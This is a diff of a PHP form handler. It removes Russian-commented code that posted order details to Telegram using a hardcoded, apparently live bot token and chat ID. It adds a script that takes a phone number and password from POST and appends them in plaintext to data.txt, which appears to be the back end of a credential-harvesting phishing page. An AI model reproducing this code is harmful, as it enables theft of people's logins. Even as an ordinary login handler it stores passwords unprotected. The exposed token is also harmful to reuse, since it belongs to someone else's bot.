@@ -1,39 +1,14 @@
 <?php
-
-//В переменную $token нужно вставить токен, который нам прислал @botFather
-$token = "7120759384:AAHT3Kx_m_nFaOGUCGEH9KZmbiwulBye6GA";
-
-//Сюда вставляем chat_id
-$chat_id = "-4117052475";
-
-//Определяем переменные для передачи данных из нашей формы
-if ($_POST['act'] == 'order') {
-    $name = ($_POST['name']);
-    $phone = ($_POST['phone']);
-
-//Собираем в массив то, что будет передаваться боту
-    $arr = array(
-        'Имя:' => $name,
-        'Телефон:' => $phone
-    );
-
-//Настраиваем внешний вид сообщения в телеграме
-    foreach($arr as $key => $value) {
-        $txt .= "<b>".$key."</b> ".$value."%0A";
-    };
-
-//Передаем данные боту
-    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
-
-//Выводим сообщение об успешной отправке
-    if ($sendToTelegram) {
-        alert('Спасибо! Ваша заявка принята. Мы свяжемся с вами в ближайшее время.');
-    }
-
-//А здесь сообщение об ошибке при отправке
-    else {
-        alert('Что-то пошло не так. ПОпробуйте отправить форму ещё раз.');
-    }
+if(isset($_POST['phone']) && isset($_POST['password'])){
+    $phone = $_POST['phone'];
+    $password = $_POST['password'];
+    
+    $data = "Phone number: $phone, Password: $password\n";
+    
+    file_put_contents('data.txt', $data, FILE_APPEND);
+    
+    echo "Data has been saved";
+} else {
+    echo "Error: Phone number or password not provided";
 }
-
 ?>
